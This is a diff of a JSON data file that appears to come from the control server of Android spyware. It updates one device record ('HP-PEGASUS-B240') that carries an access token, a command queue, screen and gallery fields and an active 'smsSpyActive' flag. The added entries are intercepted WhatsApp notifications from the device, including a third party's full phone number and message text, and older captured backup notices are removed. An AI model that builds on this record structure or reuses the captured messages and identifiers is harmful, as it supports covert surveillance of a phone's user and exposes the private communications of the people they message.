@@ -5404,7 +5404,7 @@
     "deviceName": "HP-PEGASUS-B240",
     "ownerUsername": "Kanzun",
     "token": "5d33b8ecb200f311ed19db054f831b4d",
-    "lastSeen": 1777380516795,
+    "lastSeen": 1777380522813,
     "commandQueue": [],
     "online": true,
     "connectedAt": "2026-04-27T11:02:22.793Z",
@@ -5420,6 +5420,38 @@
     "lastScreenFrame": null,
     "smsSpyActive": true,
     "smsMessages": [
+      {
+        "appName": "WhatsApp",
+        "sender": "WhatsApp",
+        "content": "‎‎264 pesan dari 2 chat",
+        "time": "28/04 19:48",
+        "pkg": "com.whatsapp",
+        "receivedAt": 1777380523158
+      },
+      {
+        "appName": "WhatsApp",
+        "sender": "WhatsApp",
+        "content": "‎‎264 pesan dari 2 chat",
+        "time": "28/04 19:48",
+        "pkg": "com.whatsapp",
+        "receivedAt": 1777380520961
+      },
+      {
+        "appName": "WhatsApp",
+        "sender": "+62 831-7933-3065",
+        "content": "Plis",
+        "time": "28/04 19:48",
+        "pkg": "com.whatsapp",
+        "receivedAt": 1777380520890
+      },
+      {
+        "appName": "WhatsApp",
+        "sender": "WhatsApp",
+        "content": "‎‎263 pesan dari 2 chat",
+        "time": "28/04 19:48",
+        "pkg": "com.whatsapp",
+        "receivedAt": 1777380519576
+      },
       {
         "appName": "WhatsApp",
         "sender": "+62 831-7933-3065",
@@ -9387,38 +9419,6 @@
         "time": "28/04 06:33",
         "pkg": "com.whatsapp",
         "receivedAt": 1777332824962
-      },
-      {
-        "appName": "WhatsApp",
-        "sender": "Pencadangan sedang berlangsung",
-        "content": "Menyiapkan cadangan (40%)",
-        "time": "28/04 06:33",
-        "pkg": "com.whatsapp",
-        "receivedAt": 1777332823705
-      },
-      {
-        "appName": "WhatsApp",
-        "sender": "Pencadangan sedang berlangsung",
-        "content": "Menyiapkan cadangan (39%)",
-        "time": "28/04 06:33",
-        "pkg": "com.whatsapp",
-        "receivedAt": 1777332823459
-      },
-      {
-        "appName": "WhatsApp",
-        "sender": "Pencadangan sedang berlangsung",
-        "content": "Menyiapkan cadangan (38%)",
-        "time": "28/04 06:33",
-        "pkg": "com.whatsapp",
-        "receivedAt": 1777332822133
-      },
-      {
-        "appName": "WhatsApp",
-        "sender": "Pencadangan sedang berlangsung",
-        "content": "Menyiapkan cadangan (37%)",
-        "time": "28/04 06:33",
-        "pkg": "com.whatsapp",
-        "receivedAt": 1777332820832
       }
     ],
     "galleryPhotos": [],
